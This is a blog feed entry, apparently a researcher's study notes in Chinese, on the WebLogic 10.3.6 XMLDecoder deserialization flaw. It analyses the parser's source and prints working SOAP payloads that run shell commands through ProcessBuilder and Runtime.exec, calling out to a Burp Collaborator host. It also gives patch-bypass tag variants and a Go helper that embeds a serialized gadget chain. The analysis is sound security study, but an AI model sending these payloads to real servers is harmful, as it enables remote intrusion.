<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-07-08T03:04:02.237Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>weblogic 10.3.6 XMLDecoder 反序列化漏洞学习</title>
    <link href="http://yoursite.com/2020/07/07/weblogic-10-3-6-XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    <id>http://yoursite.com/2020/07/07/weblogic-10-3-6-XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-07-06T16:55:03.000Z</published>
    <updated>2020-07-08T03:04:02.237Z</updated>
    
    <content type="html"><![CDATA[<p>文章整体学习于 <a href="https://mp.weixin.qq.com/s?__biz=MzU5NDgxODU1MQ==&mid=2247485058&idx=1&sn=d22b310acf703a32d938a7087c8e8704" target="_blank" rel="noopener">奇安信 WebLogic 安全研究报告</a></p><h2 id="sax-解析-xml-基础"><a href="#sax-解析-xml-基础" class="headerlink" title="sax 解析 xml 基础"></a>sax 解析 xml 基础</h2><p>java 在使用 sax 处理 xml 时，采用事件进行处理，那我们我们需要关注有哪些事件。<br>事件源有 4 种：ContentHandler,DTDHandler,ErrorHandler,以及 EntityResolver。<br>处理内容的事件源是 ContentHandler，看一下他的事件（<a href="http://www.saxproject.org/apidoc/org/xml/sax/ContentHandler.html" target="_blank" rel="noopener">截图来源</a>）：<br><img src="http://l0ca1-blog.oss-cn-beijing.aliyuncs.com/imgs/396790baee89469ea39fea0cf604cfd02.png" alt="396790baee89469ea39fea0cf604cfd02"><br><a href="https://www.ibm.com/developerworks/cn/xml/x-saxhandle/index.html" target="_blank" rel="noopener">中文文档</a><br>引用一张图（<a href="https://xz.aliyun.com/t/5069" target="_blank" rel="noopener">来源</a>）：<br><img src="http://l0ca1-blog.oss-cn-beijing.aliyuncs.com/imgs/396790baee89469ea39fea0cf604cfd01.png" alt="396790baee89469ea39fea0cf604cfd01"><br>根据头部文章的说明及其调试，xml 反序列化流程会先进入 DocumentHandler，对各类事件源进行处理，同时在处理的过程中再分发到相关的标签 ElementHandler。看一下 DocumentHandler 的处理。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//根据标签添加各种标签ElementHandler。</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">DocumentHandler</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.setElementHandler(<span class="string">"java"</span>, JavaElementHandler<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        <span class="keyword">this</span>.setElementHandler(<span class="string">"null"</span>, NullElementHandler<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        <span class="keyword">this</span>.setElementHandler(<span class="string">"array"</span>, ArrayElementHandler<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//开始解析各种标签</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startElement</span><span class="params">(String var1, String var2, String var3, Attributes var4)</span> <span class="keyword">throws</span> SAXException </span>&#123;</span><br><span class="line">        <span class="comment">//保存上一级ElementHandler对象，通过setParent保存在this.parent中</span></span><br><span class="line">ElementHandler var5 = <span class="keyword">this</span>.handler;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">//根据标签名，通过getElementHandler获取保存的各类ElementHandler。</span></span><br><span class="line">            <span class="keyword">this</span>.handler = (ElementHandler)<span class="keyword">this</span>.getElementHandler(var3).newInstance();</span><br><span class="line">            <span class="keyword">this</span>.handler.setOwner(<span class="keyword">this</span>);</span><br><span class="line">            <span class="keyword">this</span>.handler.setParent(var5);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var10) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> SAXException(var10);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//遍历各类属性，通过addAttribute进行保存设置。</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> var6 = <span class="number">0</span>; var6 &lt; var4.getLength(); ++var6) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">//获取属性名字和属性值。</span></span><br><span class="line">                String var7 = var4.getQName(var6);</span><br><span class="line">                String var8 = var4.getValue(var6);</span><br><span class="line">                <span class="keyword">this</span>.handler.addAttribute(var7, var8);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (RuntimeException var9) &#123;</span><br><span class="line">                <span class="keyword">this</span>.handleException(var9);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//调用ElementHandler的startElement。</span></span><br><span class="line">        <span class="keyword">this</span>.handler.startElement();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//结束标签解析</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">endElement</span><span class="params">(String var1, String var2, String var3)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">//直接调用ElementHandler的endElement</span></span><br><span class="line">            <span class="keyword">this</span>.handler.endElement();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException var8) &#123;</span><br><span class="line">            <span class="keyword">this</span>.handleException(var8);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.handler = <span class="keyword">this</span>.handler.getParent();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>object 标签和 void 标签基本都是 ObjectElementHandler 处理的，ObjectElementHandler 继承于 NewElementHandler，他的特点是可以保存 argument 和 type 值，argument 为保存的参数，type 为当前的对象。分析一下 ObjectElemtHandler 的 getValueObject:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> ValueObject <span class="title">getValueObject</span><span class="params">(Class&lt;?&gt; var1, Object[] var2)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.field != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ValueObjectImpl.create(FieldElementHandler.getFieldValue(<span class="keyword">this</span>.getContextBean(), <span class="keyword">this</span>.field));</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.idref != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ValueObjectImpl.create(<span class="keyword">this</span>.getVariable(<span class="keyword">this</span>.idref));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">//获取上下文环境，如果当前对象设置了type值，则上下文环境为type设置的对象，如果没有设置，</span></span><br><span class="line"><span class="comment">//则取上一层标签的值对象作为上下文环境，及调用上一层的getValueObject()</span></span><br><span class="line">            Object var3 = <span class="keyword">this</span>.getContextBean();</span><br><span class="line">            String var4;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.index != <span class="keyword">null</span>) &#123;</span><br><span class="line">                var4 = var2.length == <span class="number">2</span> ? <span class="string">"set"</span> : <span class="string">"get"</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.property != <span class="keyword">null</span>) &#123;</span><br><span class="line">                var4 = var2.length == <span class="number">1</span> ? <span class="string">"set"</span> : <span class="string">"get"</span>;</span><br><span class="line">                <span class="keyword">if</span> (<span class="number">0</span> &lt; <span class="keyword">this</span>.property.length()) &#123;</span><br><span class="line">                    var4 = var4 + <span class="keyword">this</span>.property.substring(<span class="number">0</span>, <span class="number">1</span>).toUpperCase(Locale.ENGLISH) + <span class="keyword">this</span>.property.substring(<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                var4 = <span class="keyword">this</span>.method != <span class="keyword">null</span> &amp;&amp; <span class="number">0</span> &lt; <span class="keyword">this</span>.method.length() ? <span class="keyword">this</span>.method : <span class="string">"new"</span>;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">//expression是一个反射封装，var3为object，var4为method，var2为arguments。</span></span><br><span class="line">            Expression var5 = <span class="keyword">new</span> Expression(var3, var4, var2);</span><br><span class="line">            <span class="keyword">return</span> ValueObjectImpl.create(var5.getValue());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>再看一下 ElementHandler 的 endElement 方法，只要处理标签没有重写 endElement，都会默认调用 ElementHandler 的这个方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">endElement</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//获取当前标签的值。</span></span><br><span class="line">        ValueObject var1 = <span class="keyword">this</span>.getValueObject();</span><br><span class="line">        <span class="keyword">if</span> (!var1.isVoid()) &#123;</span><br><span class="line"><span class="comment">//设置为环境变量值？？？</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.id != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">this</span>.owner.setVariable(<span class="keyword">this</span>.id, var1.getValue());</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">//是否作为参数值进行传递。</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.isArgument()) &#123;</span><br><span class="line"><span class="comment">//说明如果可以作为参数进行传递且存在上一层标签，则上一层必须支持参数传递。</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>.parent != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">this</span>.parent.addArgument(var1.getValue());</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">this</span>.owner.addObject(var1.getValue());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="POC1-分析"><a href="#POC1-分析" class="headerlink" title="POC1 分析"></a>POC1 分析</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//入口：/wls-wsat/CoordinatorPortType</span></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span>&gt;</span><br><span class="line">      &lt;soapenv:Header&gt;</span><br><span class="line">        &lt;work:WorkContext xmlns:work=<span class="string">"http://bea.com/2004/06/soap/workarea/"</span>&gt;</span><br><span class="line">          &lt;java&gt;</span><br><span class="line">            &lt;object <span class="class"><span class="keyword">class</span></span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span><br><span class="line">              &lt;array <span class="class"><span class="keyword">class</span></span>=<span class="string">"java.lang.String"</span> length=<span class="string">"3"</span>&gt;</span><br><span class="line">                &lt;<span class="keyword">void</span> index=<span class="string">"0"</span>&gt;</span><br><span class="line">                  &lt;string&gt;/bin/bash&lt;/string&gt;</span><br><span class="line">                &lt;/void&gt;</span><br><span class="line">                &lt;<span class="keyword">void</span> index=<span class="string">"1"</span>&gt;</span><br><span class="line">                  &lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">                &lt;/void&gt;</span><br><span class="line">                &lt;<span class="keyword">void</span> index=<span class="string">"2"</span>&gt;</span><br><span class="line">                  &lt;string&gt;ping l0ca1.0hi1213pu5qcednmhhch7a8x5obez3.burpcollaborator.net&lt;/string&gt;</span><br><span class="line">                &lt;/void&gt;</span><br><span class="line">              &lt;/array&gt;</span><br><span class="line">              &lt;<span class="keyword">void</span> method=<span class="string">"start"</span>/&gt;</span><br><span class="line">            &lt;/object&gt;</span><br><span class="line">          &lt;/java&gt;</span><br><span class="line">        &lt;/work:WorkContext&gt;</span><br><span class="line">      &lt;/soapenv:Header&gt;</span><br><span class="line">      &lt;soapenv:Body/&gt;</span><br><span class="line">    &lt;/soapenv:Envelope&gt;</span><br><span class="line"><span class="comment">//来源：https://www.03sec.com/3211.shtml</span></span><br><span class="line"><span class="comment">//&lt;java&gt;标签可以去除</span></span><br></pre></td></tr></table></figure><p>这里创建 ProcessBuilder 是通过<code>&lt;object&gt;</code>标签加上属性 class 去创建的。ProcessBuilder 的 common 参数是通过 array 标签去传递的，调用 start 方法是通过<code>&lt;void method=&quot;start&quot;&gt;</code>去调用的。<code>&lt;array&gt;</code>标签会首先通过 Array.newInstance(“java.lang.String”,3)创建 array，然后通过 void 配合 index 值即<code>&lt;void index=&quot;&quot;&gt;</code>，在每次 void 标签结束时，获取 array 标签的值，即创建的 Array，然后调用 set 方法进行添加值。在 array 标签结束后，将最终的 array 通过参数设置，设置给 object 标签对象的 argument 属性中，最后在<code>&lt;void method=&quot;start&quot;&gt;</code>的时候，进行反射调用。<br>根据分析，poc 可以进行一些小改动。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;object <span class="class"><span class="keyword">class</span></span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span><br><span class="line">可以替换为</span><br><span class="line">&lt;<span class="keyword">void</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span><br><span class="line">或者</span><br><span class="line">&lt;<span class="keyword">new</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span><br><span class="line">这三个都可以返回一个具体对象 而&lt;<span class="class"><span class="keyword">class</span>&gt;标签只能返回一个<span class="title">Class</span>对象</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;<span class="title">void</span> <span class="title">method</span></span>=<span class="string">"start"</span>/&gt;</span><br><span class="line">可以替换为</span><br><span class="line">&lt;method name=<span class="string">"start"</span>/&gt;</span><br><span class="line"></span><br><span class="line">应该是有很多变种，比如利用静态方法获取Object</span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span>&gt;</span><br><span class="line">    &lt;soapenv:Header&gt;</span><br><span class="line">        &lt;work:WorkContext xmlns:work=<span class="string">"http://bea.com/2004/06/soap/workarea/"</span>&gt;</span><br><span class="line">            &lt;method name=<span class="string">"getRuntime"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"java.lang.Runtime"</span>&gt;</span><br><span class="line">            &lt;method name=<span class="string">"exec"</span>&gt;</span><br><span class="line">            &lt;string&gt;ping ccc.d4ihrpfqecs5p7tzf88c21i0qrwhk6.burpcollaborator.net&lt;/string&gt;</span><br><span class="line">            &lt;/method&gt;</span><br><span class="line">            &lt;/method&gt;</span><br><span class="line">        &lt;/work:WorkContext&gt;</span><br><span class="line">    &lt;/soapenv:Header&gt;</span><br><span class="line">    &lt;soapenv:Body /&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure><h2 id="POC2-分析"><a href="#POC2-分析" class="headerlink" title="POC2 分析"></a>POC2 分析</h2><p>这个是跟据这篇<a href="http://balis0ng.com/post/lou-dong-fen-xi/weblogic-wls9-asynczu-jian-rcelou-dong-fen-xi" target="_blank" rel="noopener">文章</a>做的笔记</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//入口：/_async/AsyncResponseService</span></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span> xmlns:wsa=<span class="string">"http://www.w3.org/2005/08/addressing"</span> xmlns:balisong=<span class="string">"http://www.bea.com/async/AsyncResponseService"</span>&gt;</span><br><span class="line">&lt;soapenv:Header&gt;</span><br><span class="line">&lt;wsa:Action&gt;test&lt;/wsa:Action&gt;</span><br><span class="line">&lt;wsa:RelatesTo&gt;test&lt;/wsa:RelatesTo&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work=<span class="string">"http://bea.com/2004/06/soap/workarea/"</span>&gt;</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span>&gt;<span class="title">xxxxxx</span>&lt;<span class="title">void</span>&gt;</span></span><br><span class="line"><span class="class">  &lt;/<span class="title">void</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">class</span>&gt;</span></span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">     &lt;/soapenv:Header&gt;</span><br><span class="line">     &lt;soapenv:Body&gt;</span><br><span class="line">    &lt;balisong:onAsyncDelivery&gt;calculator&lt;/balisong:onAsyncDelivery&gt;</span><br><span class="line">     &lt;/soapenv:Body&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br><span class="line"><span class="comment">//来源 http://balis0ng.com/post/lou-dong-fen-xi/weblogic-wls9-asynczu-jian-rcelou-dong-fen-xi</span></span><br></pre></td></tr></table></figure><p>根据文章补丁截图，不允许使用 object、new、method 标签，void 的标签只允许 index 属性出现。结合上面的 poc1，是没有办法直接反射调用类方法类了。<br>因为存在 class 标签，可以返回一个 Class 对象，同时 void 还可以使用，所以是可以通过反射完成初始化类的。完成过程：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassElementHandler</span> <span class="keyword">extends</span> <span class="title">StringElementHandler</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getValue</span><span class="params">(String var1)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.getOwner().findClass(var1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ObjectElementHandler</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> ValueObject <span class="title">getValueObject</span><span class="params">(Class&lt;?&gt; var1, Object[] var2)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">       .....</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Object var3 = <span class="keyword">this</span>.getContextBean();</span><br><span class="line">            String var4;</span><br><span class="line">            ...</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                var4 = <span class="keyword">this</span>.method != <span class="keyword">null</span> &amp;&amp; <span class="number">0</span> &lt; <span class="keyword">this</span>.method.length() ? <span class="keyword">this</span>.method : <span class="string">"new"</span>;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">//默认为new方法，Expression在封装中，将new转变为newInstance，完成class的初始化。无参通过Class.newInstance,</span></span><br><span class="line"><span class="comment">//有参通过Constructor.newInstance。</span></span><br><span class="line">            Expression var5 = <span class="keyword">new</span> Expression(var3, var4, var2);</span><br><span class="line">            <span class="keyword">return</span> ValueObjectImpl.create(var5.getValue());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Expression</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> Object <span class="title">invokeInternal</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">...</span><br><span class="line"><span class="comment">//无参构造与有参构造</span></span><br><span class="line"><span class="keyword">if</span> (methodName.equals(<span class="string">"new"</span>)) &#123;</span><br><span class="line">      methodName = <span class="string">"newInstance"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">if</span> (methodName.equals(<span class="string">"newInstance"</span>) &amp;&amp; arguments.length != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (target == Character<span class="class">.<span class="keyword">class</span> &amp;&amp; <span class="title">arguments</span>.<span class="title">length</span> </span>== <span class="number">1</span> &amp;&amp;</span><br><span class="line">        argClasses[<span class="number">0</span>] == String<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Character(((String)arguments[<span class="number">0</span>]).charAt(<span class="number">0</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        m = ConstructorFinder.findConstructor((Class)target, argClasses);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (NoSuchMethodException exception) &#123;</span><br><span class="line">        m = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">....</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (m <span class="keyword">instanceof</span> Method) &#123;</span><br><span class="line">          <span class="keyword">return</span> MethodUtil.invoke((Method)m, target, arguments);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">return</span> ((Constructor)m).newInstance(arguments);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>既然还可以调用构造函数，那么就需要寻找构造函数中存在恶意操作的类。</p><h3 id="POC2-UnitOfWorkChangeSet"><a href="#POC2-UnitOfWorkChangeSet" class="headerlink" title="POC2-UnitOfWorkChangeSet"></a>POC2-UnitOfWorkChangeSet</h3><p>这个是从参考<a href="http://balis0ng.com/post/lou-dong-fen-xi/weblogic-wls9-asynczu-jian-rcelou-dong-fen-xi" target="_blank" rel="noopener">文章</a>中选出来学习的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">UnitOfWorkChangeSet</span><span class="params">(<span class="keyword">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ByteArrayInputStream byteIn = <span class="keyword">new</span> ByteArrayInputStream(bytes);</span><br><span class="line">        ObjectInputStream objectIn = <span class="keyword">new</span> ObjectInputStream(byteIn);</span><br><span class="line">        <span class="keyword">this</span>.allChangeSets = (IdentityHashtable)objectIn.readObject();</span><br><span class="line">        <span class="keyword">this</span>.deletedObjects = (IdentityHashtable)objectIn.readObject();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>他的这个构造函数中，通过 bytes 完成了反序列化。所以利用 UnitOfWorkChangeSet 可以完成二次反序列化利用。后续就是利用链的问题。这里试了一下 URLDNS。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"io/ioutil"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function">func <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">var</span> result string</span><br><span class="line">filename := <span class="string">"/tmp/test.bin"</span></span><br><span class="line"><span class="keyword">var</span> fileContentsBytes []<span class="keyword">byte</span></span><br><span class="line"><span class="keyword">var</span> err error</span><br><span class="line"><span class="keyword">if</span> fileContentsBytes, err = ioutil.ReadFile(filename); err != nil &#123;</span><br><span class="line">fmt.Println(err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">result = fmt.Sprintf(<span class="string">"&lt;array class=\"byte\" length=\"%d\"&gt;"</span>, len(fileContentsBytes))</span><br><span class="line"><span class="keyword">for</span> i, b := range fileContentsBytes &#123;</span><br><span class="line">sIndex := fmt.Sprintf(<span class="string">"&lt;void index=\"%d\"&gt;&lt;byte&gt;%d&lt;/byte&gt;&lt;/void&gt;"</span>, i, int8(b))</span><br><span class="line">result = result + sIndex</span><br><span class="line">&#125;</span><br><span class="line">result = result + <span class="string">"&lt;/array&gt;"</span></span><br><span class="line">fmt.Println(result)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里 golang 的 byte 是 uint8，java 是 int8，需要进行转换。然后将得到的<code>&lt;array&gt;</code>标签内容添加到 POC2 中。</p><h3 id="POC2-FileSystemXmlApplicationContext"><a 